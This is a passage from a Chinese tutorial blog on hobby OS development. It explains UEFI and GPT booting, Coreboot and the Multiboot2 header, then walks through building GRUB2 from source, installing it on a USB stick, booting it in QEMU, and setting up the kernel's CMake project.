提供的相似功能接口使用方式是 Y，那操作系统就得为不同厂商的不同功能编写多套代码</p><p>而有了 UEFI 规范，厂商 A、B 的 UEFI 固件都需要向上层提供统一的接口，从而使得操作系统可以用相同的方式调用某个功能，避免了代码分裂的情况</p></blockquote><p>这里引用一张非常经典的图片简述 UEFI 启动的基本过程：</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231113191232.png"></p><p>相应地，UEFI 启动不再使用老旧的 MBR 分区表，而是使用 <strong>GUID Partion Table</strong> （GPT 分区表），以 512 字节为单位作为一个<strong>逻辑块</strong>（Logic Block，相对应的区块地址便称为 LBA），前 34 个 LBA 用来记录分区信息，其中 LBA0 为了兼容性保留给 MBR 使用，LBA1 记录分区表自身的信息、备份用 GPT 分区（最后 34 个 LBA 的位置）、分区的 CRC 校验码等，LBA2 ~ LBA 33 则用来记录分区信息，每个 LBA 可以记录四个条目：</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231129220808.png"></p><blockquote><h4 id="扩展阅读：兼容支持模块（Compatibility-Support-Module）"><a href="#扩展阅读：兼容支持模块（Compatibility-Support-Module）" class="headerlink" title="扩展阅读：兼容支持模块（Compatibility Support Module）"></a>扩展阅读：兼容支持模块（Compatibility Support Module）</h4><p>在 UEFI 逐渐替换掉计算机底层固件的风潮涌动之时，尚有大量的设备仍旧使用传统的 MBR 分区表，为了进行兼容，CSM 这一兼容支持模块会模拟传统 BIOS 的功能，为这些设备系统按照传统的 BIOS + MBR 方式进行引导，并提供传统 BIOS 的 0x10 等中断服务</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231129203153.png"></p></blockquote><h2 id="Coreboot"><a href="#Coreboot" class="headerlink" title="Coreboot"></a><em>Coreboot</em></h2><p><strong>Coreboot</strong> 起源于 <strong>LinuxBIOS</strong>，最初的思路是 <em>既然 Linux 有比较好的硬件支持，那计算机启动以后直接跳 Linux就完事了</em>  ， 于是 <em>使用 20 行汇编完成初始化并将 Flash 中的 Linux 拷贝至内存后直接跳过去</em> 的 LinuxBIOS 诞生于 1999年，随后经过不断发展，引导 Linux 所用的程序越来越大，于是项目在 2008 年改名为 coreboot，项目结构变为 <code>coreboot + payload</code>，Linux 则成为了 <em>可选的一段 payload</em> ，通过这样的模式，Coreboot 可以通过引入不同的 payload 来支持多种不同的启动规范，包括 Legacy BIOS 和 UEFI</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231129222934.png"></p><blockquote><p>目前市面上正在使用 Coreboot 的主流产品有 Google Chromebook 和 System76 旗下的笔记本等</p></blockquote><h1 id="0x02-多重引导规范-GNU-GRUB"><a href="#0x02-多重引导规范-GNU-GRUB" class="headerlink" title="0x02. 多重引导规范 &amp; GNU GRUB"></a>0x02. 多重引导规范 &amp; GNU GRUB</h1><h2 id="Why-GRUB？"><a href="#Why-GRUB？" class="headerlink" title="Why GRUB？"></a>Why GRUB？</h2><p>现今的大部分所谓“教你自行编写操作系统”的无论是教程也好书籍也好，都存在着一个小小的问题：<strong>对 Legacy BIOS 的内核引导阶段大书特书</strong>——诚然，了解一台计算机从启动开始到内核真正运作这段期间的实现细节无疑是十分重要的一件事情，对于操作系统学习而言或许也有不小的帮助，但很容易让初学者陷入到与各种硬件博弈的苦战当中，同时对于实际的开发而言手动编写一个<strong>仅适用于我们自己的内核</strong>的客制化 <code>MBR + boot loader</code> 意义并不算特别大</p><blockquote><p> <del>再说都什么时代了还在用 Legacy BIOS，Wintel 联盟都宣布这玩意已经彻底成为历史了，👴🚪就没有必要再深究了，大概了解一下差不多得了</del></p></blockquote><p>而 UEFI 规范虽然给了我们更为方便地通过 UEFI 的各种接口实现不同的功能，但<strong>UEFI 的大部分功能在 Runtime 阶段是不可用的</strong>，同时这也少不了编写设备识别、文件系统解析等工作，再配上编写各种基础设施，一套写下来一个EFI 程序其实差不多就已经是一个完整的小内核了——当然， <em>直接用 EFI 程序作为操作系统内核不是不行，看着也确实像个样子</em> ，<strong>就是不太优雅，也不太现代</strong></p><p>因此，对于内核引导阶段，我们暂时选择<strong>直接复用现有的成熟的方案</strong>——例如「GNU GRUB」，其同时支持 Legacy BIOS 与 UEFI 引导，让我们不用在一开始就陷入到与各种存储设备斗争的泥潭当中</p><p><img src="https://s2.loli.net/2022/09/07/eTCVOtlpE7PYFXq.png" alt="image.png"></p><blockquote><p>当然，如果说仅从「学习」的角度而言自己亲手写一个 <code>MBR + boot loader</code> &#x2F; <code>EFI</code> 并亲身体会到其载入内核的整个过程其实是一件非常有益处的事情（笑）</p><blockquote><p>先挖个坑：我们将在操作系统内核开发完成之后的后续补充文章中<strong>自行开发一个 EFI 程序以引导符合 multiboot2 规范的内核</strong></p></blockquote></blockquote><blockquote><p>也有人会问：那为什么不用 <a href="https://github.com/limine-bootloader/limine">Limine</a> 或是 <a href="https://gitlab.com/bztsrc/bootboot">BOOTBOOT</a> 这样更加现代的 boot loader 呢？一个原因就是因为 GRUB 相对有着更好的兼容性，能够在更多设备上运行，教程资料也比较多</p></blockquote><h2 id="Multiboot2-规范"><a href="#Multiboot2-规范" class="headerlink" title="Multiboot2 规范"></a>Multiboot2 规范</h2><p>那么我们如何让 GNU GRUB 知道他该怎么引导一个什么样的内核呢？答案是通过<a href="https://www.gnu.org/software/grub/manual/multiboot/multiboot.html">多重引导规范</a>（Multiboot Specification），该规范制定的目的是使得遵循该规范的操作系统可以被同样遵循该规范的 boot loader 引导，而无需编写特定于 OS 的 boot loader</p><p>GNU GRUB 第二版进行了完全的重写，多重引导规范也有个<a href="https://www.gnu.org/software/grub/manual/multiboot2/multiboot.html">第二版</a>，不过好在 GRUB2 同时支持两版引导规范——这里我们使用<strong>第二版</strong>的规范</p><blockquote><p>然而 Linux kernel 使用的<strong>并不是 multiboot  规范</strong>，而是其<a href="https://www.kernel.org/doc/Documentation/x86/boot.txt">自定义的协议</a></p></blockquote><p>多重引导规范要求我们的内核映像的前 <code>32768</code> 字节中一个任意的 <strong>64位对齐的位置</strong> 必须要有一个 <a href="https://www.gnu.org/software/grub/manual/multiboot2/multiboot.html#Header-layout"><code>multiboot2 header</code></a> 来记录相应的信息，格式如下：</p><table><thead><tr><th>Offset</th><th>Type</th><th>Field Name</th><th>Note</th></tr></thead><tbody><tr><td>0</td><td>u32</td><td>magic</td><td>required</td></tr><tr><td>4</td><td>u32</td><td>architecture</td><td>required</td></tr><tr><td>8</td><td>u32</td><td>header_length</td><td>required</td></tr><tr><td>12</td><td>u32</td><td>checksum</td><td>required</td></tr><tr><td>16-XX</td><td></td><td>tags</td><td>required</td></tr></tbody></table><ul><li><p><code>magic</code>：multiboot2 header 的标识，必须为 <code>0xE85250D6</code></p></li><li><p><code>architecture</code>：标识指令集架构，0 表示 32 位 i386 保护模式，4 表示 32 位 MIPS</p></li><li><p><code>header_length</code> ：包含 tags 在内的整个 multiboot2 header 的大小</p></li><li><p><code>checksum</code>：该域与前三个域相加的和为无符号 0</p></li><li><p><code>tags</code>：补充域，其格式通常如下，以类似数组的形式跟在后边，<strong>每个 tag 的起始地址8 字节对齐</strong>，<strong>整个 tag 数组以一个 type 为 0 及 size 为 8 的 tag 结尾</strong>，关于不同类型的 tag 格式，参见<a href="https://www.gnu.org/software/grub/manual/multiboot2/multiboot.html#Header-tags">此处</a>：</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">        +-------------------+<br>u16     |<span class="hljs-string"> type              </span>|<br>u16     |<span class="hljs-string"> flags             </span>|<br>u32     |<span class="hljs-string"> size              </span>|<br>        +-------------------+<br></code></pre></td></tr></table></figure></li></ul><h2 id="在-U-盘上安装-GRUB2"><a href="#在-U-盘上安装-GRUB2" class="headerlink" title="在 U 盘上安装 GRUB2"></a>在 U 盘上安装 GRUB2</h2><p>虽然很多操作系统编写教程都是在虚拟机当中运行的，毕竟 <em>对于操作系统初学者而言更重要的是了解整个操作系统的运行机理</em> ，但是<strong>在物理机上运行自己写的操作系统是非常令人感到愉悦的一件事情</strong>，所以这里我们将会介绍如何在 U 盘上安装 GRUB 来引导自己的操作系统内核</p><blockquote><p>如果你不想弄这一部分，也可以跳转到下一节，直接开始安全地使用 QEMU，我们后面的各种开发调试其实主要也是在 QEMU 上完成的 ：）</p></blockquote><ul><li><p>如果你在物理机上使用 Linux 作业系统，请找到你的 U 盘对应的设备节点，通常情况下，如果你的计算机<strong>仅</strong>使用 <code>nvme m.2</code> 固态硬盘，则新插入的 U 盘 <em>通常</em> 是 <code>/dev/sda</code> ，<strong>如果你则计算机仍在使用 SATA 接口的硬盘，请注意自行确定设备路径</strong></p></li><li><p>如果你在物理机上使用 Windows 操作系统，出于易用性考虑我们并不使用 WSL，<strong>而是在 Vmware 虚拟机中安装一个 Linux 操作系统</strong>，并通过如下方式将 U 盘连接到虚拟机中（请先确定好你的 U 盘对应的设备名称），在你的虚拟机处在默认配置且不存在外部存储设备的情况下，U 盘对应的设备节点通常是 <code>/dev/sdb</code>：</p></li></ul><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231114214055.png"></p><blockquote><p> 也可以通过<strong>物理重新拔插可移动设备</strong>以让 Vmware 自行截获：</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231114214205.png"></p><p>如果你是其他情况，请自行进行判断 ：)</p></blockquote><p>首先安装一些你可能会需要的依赖：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt install -y dosfstools mtools gparted gcc cmake git bison libopts25 libselinux1-dev m4 help2man libopts25-dev flex libfont-freetype-perl automake make autotools-dev autopoint libfreetype6-dev texinfo python3 autogen autoconf libtool libfuse3-3 unifont gettext binutils pkg-config liblzma5 libdevmapper-dev</span><br></code></pre></td></tr></table></figure><p>接下来我们对 U 盘进行分区，<strong>请确保你已经将所有重要数据完成备份</strong>，这里笔者选择使用 <code>GParted</code> 进行分区，我们首先通过 <code>Device→Create Partion Table...</code> 建立一个 GPT 分区表：</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231114214927.png"></p><blockquote><p>此时可能会提示无法重建分区表，这是因为操作系统可能偷偷帮你把分区挂载在 <code>/run/你的用户名</code> ，请使用 <code>umount</code> 卸载所有活动分区，之后重新启动 <code>GParted</code></p></blockquote><p>然后右键新建分区，这里笔者选择建立一个大小为 512MB 的 EFI 分区，注意<strong>该分区必须为 fat32 格式</strong>，剩余的空间作为一个文件系统分区， <em>我们将在后续开发文件系统时用到它</em> ，划分好后点绿色的✅然后 <code>Apply</code>：</p><blockquote><p>这里 GParted 会在 U 盘末尾留下 1MB 的空间，用来放 MBR 分区表，主要是出于兼容目的</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231127160626.png"></p><p>接下来我们从源码编译 GRUB，首先从 <a href="https://ftp.gnu.org/gnu/grub/">GNU GRUB 的 FTP 服务器</a>进行下载源码，然后在单独的文件夹中进行编译，这里我们三种 GRUB 都编译上：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">wget https://ftp.gnu.org/gnu/grub/grub-2.06.tar.xz</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">也可以从这里获取： git <span class="hljs-built_in">clone</span> git://git.savannah.gnu.org/grub.git</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">tar -xf grub-2.06.tar.xz</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cd</span> grub-2.06/</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">mkdir</span> EFI32 EFI64 BIOS</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cd</span> EFI64</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">../configure --target=x86_64 --with-platform=efi &amp;&amp; make -j$(<span class="hljs-built_in">nproc</span>)</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cd</span> ../EFI32</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">../configure --target=i386 --with-platform=efi &amp;&amp; make -j$(<span class="hljs-built_in">nproc</span>)</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cd</span> ../BIOS</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">../configure --target=i386 --with-platform=pc --disable-nls &amp;&amp; make -j$(<span class="hljs-built_in">nproc</span>)</span><br></code></pre></td></tr></table></figure><blockquote><p>注：如果你使用的是 Arch&#x2F;Fedora&#x2F;openSUSE 这样更新比较快的系统，在编译的时候可能会出错（<del>GCC 背大锅</del>），那么这个时候可能就需要使用更新版本的源码，笔者物理机此前使用的是 Fedora Workstation 38，编译 2.06 时爆了莫名其妙的问题，所以后来笔者选择了 <a href="https://git.savannah.gnu.org/cgit/grub.git/tag/?h=grub-2.12-rc1">2.12 rc1</a> 版本的 GRUB2</p></blockquote><p>然后将 GRUB2 安装到 U 盘的 EFI 分区上：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo mount /dev/sdb1 /mnt <span class="hljs-comment"># 注意替换成自己的 U 盘对应的设备节点</span></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cd</span> ../EFI64/grub-core</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo ../grub-install -d <span class="hljs-variable">$PWD</span> --force --removable --no-floppy --target=x86_64-efi --boot-directory=/mnt/boot --efi-directory=/mnt</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cd</span> ../../EFI32/grub-core</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo ../grub-install -d <span class="hljs-variable">$PWD</span> --force --removable --no-floppy --target=i386-efi --boot-directory=/mnt/boot --efi-directory=/mnt</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cd</span> ../../BIOS/grub-core</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo ../grub-install -d <span class="hljs-variable">$PWD</span> --force --no-floppy --target=i386-pc --boot-directory=/mnt/boot /dev/sdb</span><br></code></pre></td></tr></table></figure><blockquote><p>这里直接用系统自带的 <code>grub-install</code> 也可以直接安装，但是笔者在 Fedora 系统上使用自带的 <code>grub2-install</code> 时出现了这样一个错误：</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">grub2-install: <span class="hljs-keyword">error</span>: this utility cannot be used <span class="hljs-keyword">for</span> EFI platforms because <span class="hljs-keyword">it</span> <span class="hljs-keyword">does</span> <span class="hljs-keyword">not</span> support UEFI Secure Boot.<br></code></pre></td></tr></table></figure><p>网上也没有找到什么比较好的解决方案，笔者只好从源码进行编译</p><blockquote><p>但是 Ubuntu&#x2F;openSUSE 自带的 <code>grub-install/grub2-install</code> 就能正常使用，怎么回事呢</p></blockquote></blockquote><p>接下来我们新建一个文件 <code>/mnt/boot/grub/grub.cfg</code> （假设你的 U 盘 EFI 分区和笔者一样挂载在 <code>/mnt</code> 下），其为 GRUB 的配置文件，编写内容如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs cfg">set timeout=10  # waiting time befo automatic booting<br>set default=0   # default menu entry index<br><br>insmod all_video<br><br>menuentry &quot;Boot ClosureOS v0.0.1&quot; &#123;<br>multiboot2 /boot/kernel.bin # use multiboot2 spec to boot<br>boot<br>&#125;<br><br>if [ $&#123;grub_platform&#125; == &quot;efi&quot; ]; then<br>menuentry &quot;UEFI Setting&quot; &#123;<br>fwsetup<br>&#125;<br>fi<br><br>menuentry &quot;System Reboot&quot; --class=reboot &#123;<br>reboot<br>&#125;<br><br>menuentry &quot;System Shutdown&quot; --class=halt &#123;<br>halt<br>&#125;<br></code></pre></td></tr></table></figure><p>卸载 U 盘，重新启动计算机，进入你的 BIOS&#x2F;UEFI 配置界面，关闭安全启动（<code>Secure Boot</code>），将 U 盘配置为第一个启动项（通常开头会有一个 <code>UEFI: </code> 的标识），重新启动计算机，接下来——</p><p><strong>GNU GRUB，启动！！！</strong></p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231129040634.png"></p><p>当然，现在我们还没有开始编写操作系统内核，所以想要直接启动会报错，不过后面我们编写的内核直接放到 U 盘 EFI 分区的<code>boot/kernel.bin</code> 这个位置就可以直接启动了：</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231114235156.png"></p><h2 id="创建包含-GRUB2-的启动镜像文件并使用-QEMU-UEFI-启动"><a href="#创建包含-GRUB2-的启动镜像文件并使用-QEMU-UEFI-启动" class="headerlink" title="创建包含 GRUB2 的启动镜像文件并使用 QEMU UEFI 启动"></a>创建包含 GRUB2 的启动镜像文件并使用 QEMU UEFI 启动</h2><p>首先安装一些可能需要的依赖：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt install -y qemu qemu-system-x86 ovmf xorriso</span><br></code></pre></td></tr></table></figure><p>然后使用如下脚本在 QEMU 中从 U 盘启动 GRUB，注意替换成你自己的 U 盘设备节点路径：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/sh</span><br>sudo qemu-system-x86_64 \<br>-bios /usr/share/ovmf/OVMF.fd \<br>-cpu kvm64,+smep,+smap \<br>-smp sockets=1,dies=1,cores=4,threads=2 \<br>-m 4G \<br>--machine q35 \<br>-drive file=/dev/sdb,format=raw,index=0,media=disk<br>-s<br></code></pre></td></tr></table></figure><p>各参数说明如下：</p><ul><li><code>-bios</code> ：指定使用的启动固件，这里是 OVMF，源自于 <a href="https://github.com/tianocore/edk2">EDK2</a> 的 UEFI 固件</li><li><code>-cpu</code>：指定 CPU 类型及特性，<code>kvm64</code> 是一种常规的 CPU 类型，<code>+smep</code> 和 <code>+smap</code> 表示开启阻止内核空间执行&#x2F;访问用户空间数据的保护</li><li><code>-smp</code>：指定 CPU 插槽数、单个插槽上 DIE 的数量、每个 DIE 的核心数、每个核心的线程数</li><li><code>-m</code>：内存大小</li><li><code>--machine</code> ：机器设备类型，QEMU 支持两种设备，另外一种是比较老的 <code>i440fx</code></li><li><code>-drive</code>：添加一个设备，这里添加了 <code>/dev/sdc</code> 设备</li><li><code>-s</code>：支持通过使用 gdb 连接 <code>0.0.0.0:1234</code> 进行调试</li></ul><p>简单测试一下，成功进入 GRUB 界面：</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231129040935.png"></p><blockquote><p>如果未指定 <code>-bios</code> 参数，则默认会使用 SeaBIOS 进行启动，此时便是传统的 BIOS + MBR 启动方式：</p><p><img src="https://cdn.jsdelivr.net/gh/rat3bant/BlogPic@master/20231129041009.png"></p></blockquote><p>不过可能也有同学手上暂时没有闲置的 U 盘或其他外部存储设备，此时我们也可以使用 <code>grub-mkrescue</code> 创建一个专门用来调试的镜像，首先创建如下目录结构：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">tree target/</span><br>target/<br>└── x86_64<br>    └── iso<br>        └── boot<br>            └── grub<br>                └── grub.cfg<br><br>4 directories, 1 file<br></code></pre></td></tr></table></figure><p>接下来使用  <code>grub-mkrescue</code> 创建镜像：</p><blockquote><p>在部分发行版上，这可能叫 <code>grub2-mkrescue</code> ，固件路径也可能不一样，请自行分辨</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">grub-mkrescue /usr/lib/grub/x86_64-efi -o kernel.iso target/x86_64/iso</span><br></code></pre></td></tr></table></figure><p>把启动脚本中的设备节点路径改成文件路径即可成功启动：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">!/bin/sh</span><br>qemu-system-x86_64 \<br>-bios /usr/share/ovmf/OVMF.fd \<br>-cpu kvm64,+smep,+smap \<br>-smp sockets=1,dies=1,cores=4,threads=2 \<br>-m 4G \<br>--machine q35 \<br>-drive file=./kernel.iso,format=raw,index=0,media=disk<br></code></pre></td></tr></table></figure><h1 id="0x03-启动一个空白内核"><a href="#0x03-启动一个空白内核" class="headerlink" title="0x03. 启动一个空白内核"></a>0x03. 启动一个空白内核</h1><p>接下来我们终于要正式开始进行内核的编写了，过去绝大部分的操作系统内核都是用 <code>汇编 + C 语言</code> 编写的，不过最近也有使用 Rust 替换 C 语言的内核实现（例如国产操作系统 <a href="https://dragonos.org/">DragonOS</a> ，<strong>与绝大多数 Linux 系统调用兼容，目前已经完成了 musl-gcc 的移植</strong>，笔者觉得非常🐂🍺），Rust 也在逐渐进入 Linux 内核，包括<a href="https://os.educg.net/#/">计算机系统能力大赛</a> 主推的也是 Rust 内核</p><p>但是对于新手而言 Rust 终归是有些难以让人绷得住，在笔者看来<strong>不能像 C 语言那样提供足够贴近于硬件底层的直接抽象</strong>，因此笔者这里还是先选择自己最喜欢的 C 语言编写内核最核心部分的代码，不过后面我们也可能引入一部分 C++ 代码 ：）</p><blockquote><p>算下来已经是笔者写的第四个内核了，希望这次能够达到比较高的一个完成度</p></blockquote><h2 id="代码基本结构"><a href="#代码基本结构" class="headerlink" title="代码基本结构"></a>代码基本结构</h2><p>最初的代码结构如下所示，包含一个空白内核：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">tree .</span><br>.<br>├── LICENSE<br>├── README.md<br>├── src<br>│   ├── arch<br>│   │   ├── CMakeLists.txt<br>│   │   └── x86<br>│   │       ├── boot<br>│   │       │   ├── boot_font.o<br>│   │       │   ├── boot_main.c<br>│   │       │   ├── boot.S<br>│   │       │   ├── boot_tty.c<br>│   │       │   └── CMakeLists.txt<br>│   │       ├── CMakeLists.txt<br>│   │       ├── include<br>│   │       │   └── asm<br>│   │       │       ├── com.h<br>│   │       │       ├── cpu_types.h<br>│   │       │       ├── io.h<br>│   │       │       └── page_types.h<br>│   │       └── linker.lds<br>│   ├── CMakeLists.txt<br>│   ├── include<br>│   │   ├── boot<br>│   │   │   └── multiboot2.h<br>│   │   ├── closureos<br>│   │   │   └── types.h<br>│   │   └── graphics<br>│   │       └── tty<br>│   │           ├── default.h<br>│   │           └── font<br>│   │               └── psf.h<br>│   └── kernel<br>│       ├── CMakeLists.txt<br>│       └── main.c<br>├── targets<br>│   └── x86_64<br>│       └── iso<br>│           └── boot<br>│               └── grub<br>│                   └── grub.cfg<br>└── tools<br>    └── scripts<br>        ├── boot.sh<br>        └── repack_iso.sh<br><br>21 directories, 24 files<br></code></pre></td></tr></table></figure><p>我们使用 <code>CMake</code> 来进行项目管理，相比起传统的 <code>Makefile</code> ，这是一种更加方便、更加自动化、更加规范的现代编译工具</p><blockquote><p>什么，你不知道如何编写 CMake？还不<a href="https://cmake.org/cmake/help/latest/index.html">赶快学！</a></p></blockquote><p>根目录的 <code>CMakeLists.txt</code> 编写如下，主要作用就是准备统一的编译参数、进入不同文件夹进行 make、链接所有的目标文件，这里我们去掉了标准库支持、去掉了调试段、指定了静态编译……因为在裸金属环境下能依赖的只有我们自己：）</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs cmake"><span class="hljs-keyword">cmake_minimum_required</span>(VERSION <span class="hljs-number">3.16</span>)<br><span class="hljs-keyword">project</span>(ClosureOS)<br><br><span class="hljs-comment"># for debugging only</span><br><span class="hljs-comment">#set(CMAKE_VERBOSE_MAKEFILE ON)</span><br><br><span class="hljs-comment"># languages we will use</span><br><span class="hljs-keyword">enable_language</span>(C)<br><span class="hljs-keyword">enable_language</span>(ASM)<br><br><span class="hljs-comment"># check for current compiler environment, temporarily support linux only</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">NOT</span> CMAKE_HOST_SYSTEM_NAME <span class="hljs-keyword">STREQUAL</span> <span class="hljs-string">&quot;Linux&quot;</span>)<br>    <span class="hljs-keyword">message</span>(FATAL_ERROR <span class="hljs-string">&quot;Unsatisfied compilation environment, only support Linux now&quot;</span>)<br><span class="hljs-keyword">endif</span>()<br><br><span class="hljs-comment"># global link script</span><br><span class="hljs-keyword">if</span> (CMAKE_HOST_SYSTEM_PROCESSOR <span class="hljs-keyword">STREQUAL</span> <span class="hljs-string">&quot;x86_64&quot;</span>)<br>    <span class="hljs-keyword">set</span>(CMAKE_EXE_LINKER_FLAGS <span class="hljs-string">&quot;$&#123;CMAKE_EXE_LINKER_FLAGS&#125; -T $&#123;CMAKE_SOURCE_DIR&#125;/arch/x86/linker.lds&quot;</span>)<br><span class="hljs-keyword">else</span>()<br>    <span class="hljs-keyword">message</span>(FATAL_ERROR <span class="hljs-string">&quot;Only support x86_64 now&quot;</span>)<br><span class="hljs-keyword">endif</span>()<br><br><span class="hljs-comment"># compile and link as bare bone project</span><br><span class="hljs-keyword">add_compile_options</span>(-pipe -ffreestanding -nostdlib -fno-pie -fno-stack-protector -mcmodel=large -fno-asynchronous-unwind-tables)<br><span class="hljs-keyword">set</span>(CMAKE_EXE_LINKER_FLAGS <span class="hljs-string">&quot;$&#123;CMAKE_EXE_LINKER_FLAGS&#125; -nostdlib -z max-page-size=0x1000 -Wl,--build-id=none -static&quot;</span>)<br><br><span class="hljs-comment"># general include dirs</span><br><span class="hljs-keyword">include_directories</span>(<span 